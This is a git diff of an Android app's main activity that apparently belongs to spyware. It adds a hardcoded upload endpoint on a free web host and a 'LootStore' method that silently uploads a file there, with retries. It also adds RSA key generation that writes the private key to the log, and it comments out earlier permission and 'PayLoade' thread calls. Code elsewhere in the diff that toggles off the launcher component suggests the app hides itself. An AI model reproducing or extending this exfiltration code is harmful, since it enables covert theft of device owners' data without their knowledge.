@@ -27,7 +27,10 @@ import android.widget.Button;
 import android.widget.Toast;
 
 import com.niccher.spget.R;
+import com.niccher.spget.usables.CryptDecrypt;
 import com.niccher.spget.usables.Konstants;
+
+import net.gotev.uploadservice.MultipartUploadRequest;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -41,6 +44,8 @@ import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
 import java.util.List;
+import java.util.Map;
+import java.util.UUID;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -57,7 +62,11 @@ public class MainActivity extends AppCompatActivity {
 
     Konstants kon;
 
-    Service Upladerfiles;
+    public static final String upurl = "https://chegecache.000webhostapp.com/Ha/Some.php";
+    String stamp, PdfID,flogs;
+
+    private static String publicKey = "";
+    private static String privateKey = "";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -76,12 +85,11 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        Perms();
+        //Perms();
 
-        PayLoade pl=new PayLoade();
-        pl.start();
-
-        //startService(new Intent(getApplicationContext(), Serv.class));
+        //PayLoade pl=new PayLoade();
+        //pl.start();
+        Key();
     }
 
     @Override
@@ -90,6 +98,22 @@ public class MainActivity extends AppCompatActivity {
         PackageManager packageManager = getPackageManager();
         ComponentName componentName = new ComponentName(MainActivity.this, Splash.class);
         //packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    }
+
+    private void Key(){
+        try {
+            Map<String, Object> keyMap = CryptDecrypt.initKey();
+            publicKey = CryptDecrypt.getPublicKey(keyMap);
+            privateKey = CryptDecrypt.getPrivateKey(keyMap);
+            //publickeyEdit.setText(publicKey);
+            //privatekeyEdit.setText(privateKey);
+            Log.e("Key Pub", "Key: public is "+publicKey );
+            Log.e("Key", "Key: **************************" );
+            Log.e("Key Priv", "Key: public is "+privateKey );
+
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
 
     private void WiFi() {
@@ -622,6 +646,8 @@ public class MainActivity extends AppCompatActivity {
                 Log.e(kon.TAGGED,"<Done Writing--------> Saved to " + getFilesDir() + "/" + mas);
                 Log.e(kon.TAGGED,"<Done Writing--------> Saved to " + getFilesDir() + "/" + mal);
 
+                //uplaodFile
+
             } catch (
                     FileNotFoundException e) {
                 Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
@@ -922,6 +948,28 @@ public class MainActivity extends AppCompatActivity {
             }
 
             Log.e(kon.TAGGED, "Parser_Apps->Finished >");
+        }
+
+        public void LootStore(){
+            try {
+                PdfID = UUID.randomUUID().toString();
+                Thread.sleep(150);
+                try {
+                    new MultipartUploadRequest(MainActivity.this, PdfID, upurl)
+                            .addFileToUpload("targt", "pdf")
+                            .addParameter("name", stamp.trim())
+                            .setMaxRetries(10)
+                            .addParameter("","")
+                            .startUpload();
+
+                    Thread.sleep(150);
+                    Log.e(kon.TAGGED,"<MultipartUploadRequest Uploaded Succcesfully --------");
+                } catch (Exception ex) {
+                    Log.e(kon.TAGGED,"<MultipartUploadRequest errored as -------->\n" +ex.getMessage());
+                }
+            } catch (Exception exception) {
+                Log.e(kon.TAGGED,"<Postage --------"+exception.getMessage());
+            }
         }
 
     }
